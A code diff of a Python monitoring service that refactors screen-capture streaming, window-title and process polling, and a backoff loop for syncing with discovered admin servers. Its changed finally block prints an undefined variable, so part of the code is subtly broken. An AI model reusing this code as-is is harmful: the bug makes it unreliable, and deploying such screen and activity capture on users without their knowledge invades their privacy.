+                f"[AutoSync] Sync failed with {admin_server.get('name', base_url)} "
+                f"(HTTP {response.status_code})"
+            )
             return False
-    
+        except Exception as e:
+            print(f"[AutoSync] Sync error: {e}")
+            return False
+
     def start_auto_sync(self):
         """Start automatic sync service"""
         def sync_worker():
+            current_interval = self.sync_interval
+            max_interval = self.sync_interval * 4 # Max backoff
+            
             while True:
                 if maintenance_mode:
                     time.sleep(5)
                     continue
-                    
-                print("🔄 Scanning for admin servers...")
+
+                print(f"[AutoSync] Scanning for admin servers... (Next in {current_interval}s)")
                 servers = self.discover_admin_servers()
-                
+
                 if servers:
-                    print(f"🎯 Found {len(servers)} admin server(s)")
+                    print(f"[AutoSync] Found {len(servers)} admin server(s)")
                     for server in servers:
                         self.sync_with_admin(server)
+                    self._last_no_server_log = 0
+                    current_interval = self.sync_interval # Reset backoff on success
                 else:
-                    print("❌ No admin servers found")
-                
-                time.sleep(self.sync_interval)
-        
+                    self._log_no_admin_servers(self.last_discovery_reason)
+                    current_interval = min(current_interval * 1.5, max_interval) # Exponential backoff
+
+                time.sleep(current_interval)
+
         threading.Thread(target=sync_worker, daemon=True).start()
 
 
@@ -1420,6 +1600,24 @@ class ScreenCaptureManager:
         self.target_fps = target_fps
         self.frame_interval = 1.0 / target_fps
         self.sct = None
+        
+        self.active_clients = 0
+        self.client_lock = threading.Lock()
+
+    def add_client(self):
+        """Register a client and start thread if needed"""
+        with self.client_lock:
+            self.active_clients += 1
+            if self.active_clients == 1:
+                self.start()
+            return True
+
+    def remove_client(self):
+        """Unregister a client and stop thread if none left"""
+        with self.client_lock:
+            self.active_clients = max(0, self.active_clients - 1)
+            if self.active_clients == 0:
+                self.stop()
 
     def start(self):
         """Start background capture thread"""
@@ -1434,7 +1632,8 @@ class ScreenCaptureManager:
         """Stop background capture thread"""
         self.is_running = False
         if self.capture_thread:
-            self.capture_thread.join(timeout=2)
+            # Short timeout so we don't block
+            self.capture_thread.join(timeout=1.0)
         with self.lock:
             self.latest_frame = None
         if self.sct:
@@ -1461,15 +1660,17 @@ class ScreenCaptureManager:
                     # Capture using mss (raw pixels) - Extremely Fast
                     sct_img = sct.grab(monitor)
                     
-                    # Convert to numpy array (BGRA -> BGR)
+                    # Convert to numpy array
                     img = np.array(sct_img)
-                    frame_bgr = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                     
-                    # Resize for performance and bandwidth (1280x720)
-                    screen_resized = cv2.resize(frame_bgr, (1280, 720))
+                    # Resize FIRST to reduce array size
+                    screen_resized = cv2.resize(img, (1280, 720))
+                    
+                    # Then color convert the smaller array (BGRA -> BGR)
+                    frame_bgr = cv2.cvtColor(screen_resized, cv2.COLOR_BGRA2BGR)
 
                     # Encode to JPEG (Quality 50% for speed/size)
-                    ret, buffer = cv2.imencode('.jpg', screen_resized, [cv2.IMWRITE_JPEG_QUALITY, 50])
+                    ret, buffer = cv2.imencode('.jpg', frame_bgr, [cv2.IMWRITE_JPEG_QUALITY, 50])
 
                     if ret:
                         frame_bytes = buffer.tobytes()
@@ -1497,6 +1698,7 @@ screen_manager = ScreenCaptureManager(target_fps=5) # 5 FPS is enough for monito
 def generate_screen_stream():
     """Generate screen stream from cached frames (non-blocking)"""
     print("Starting screen stream generator...")
+    screen_manager.add_client()
     try:
         while True:
             if maintenance_mode:
@@ -1510,7 +1712,8 @@ def generate_screen_stream():
             time.sleep(0.2)  # Client poll rate
     except GeneratorExit:
         print("Screen stream client disconnected")
-    except Exception as e:
+    finally:
+        screen_manager.remove_client()
         print(f"Screen stream error: {e}")
 
 
@@ -1829,12 +2032,6 @@ def get_persistent_client_id():
     
     return new_id
 
-@app.route('/api/secure/stats', methods=['GET'])
-@require_api_key
-def get_secure_stats_endpoint():
-    """Get secure live statistics"""
-    return get_live_stats()
-
 @app.route('/api/identity', methods=['GET'])
 def get_identity():
     """
@@ -1903,11 +2100,8 @@ def initialize_enhanced_tracker():
     # Start Explicit Interval Monitor (New Loop)
     threading.Thread(target=explicit_interval_monitor, daemon=True).start()
     
-    # Start Explicit Interval Monitor (New Loop)
-    threading.Thread(target=explicit_interval_monitor, daemon=True).start()
-    
-    # Start background screen capture thread
-    screen_manager.start()
+    # We delay screen capture starting until a client connects
+    # screen_manager.start()
     
     # Start auto-discovery service
     discovery_service = AutoDiscoveryService()
@@ -1945,10 +2139,12 @@ def explicit_interval_monitor():
     next_core = 0
     next_net = 0
     next_proc = 0
+    next_window = 0
     
-    CORE_INTERVAL = 0.5    # CPU/RAM every 0.5s (High speed)
-    NET_INTERVAL = 1.0     # Network/Window every 1s
-    PROCESS_INTERVAL = 10   # Top processes every 10s
+    CORE_INTERVAL = 2.0    # CPU/RAM every 2s
+    NET_INTERVAL = 5.0     # Network every 5s
+    PROCESS_INTERVAL = 60  # Top processes every 60s
+    WINDOW_INTERVAL = 10.0 # Window Title every 10s
     
     print("✓ Started explicit interval monitor")
     
@@ -1964,7 +2160,6 @@ def explicit_interval_monitor():
                 next_core = now + CORE_INTERVAL
                 
             # 2. Network Metrics (Medium Frequency)
-            # Note: underlying psutil diff needs time to pass, handled by module
             if ENABLE_NET_MONITOR and now >= next_net:
                 net_metrics = network_monitor.get_network_metrics()
                 with current_stats_lock:
@@ -1978,12 +2173,12 @@ def explicit_interval_monitor():
                     current_secure_stats['top_processes'] = procs
                 next_proc = now + PROCESS_INTERVAL
                 
-            # 4. Window Title (Medium Frequency - e.g. 5s)
-            # Can share NET_INTERVAL or have its own
-            if ENABLE_WINDOW_TITLES and now >= next_net: 
+            # 4. Window Title (Medium Frequency)
+            if ENABLE_WINDOW_TITLES and now >= next_window: 
                 window = window_monitor.get_active_window(enabled=True)
                 with current_stats_lock:
                     current_secure_stats['window'] = window
+                next_window = now + WINDOW_INTERVAL
             
             time.sleep(0.5) # Resolution sleep
             
@@ -2042,7 +2237,7 @@ def ensure_single_instance():
             _lock_file.flush()
             
     except IOError:
-        print("\n\n❌ ERROR: Another instance of service.py is already running!")
+        print("\n\n[ERROR] Another instance of service.py is already running!")
         print(f"Check {lock_path} or use task manager to kill python processes.")
         sys.exit(1)
     except Exception as e:
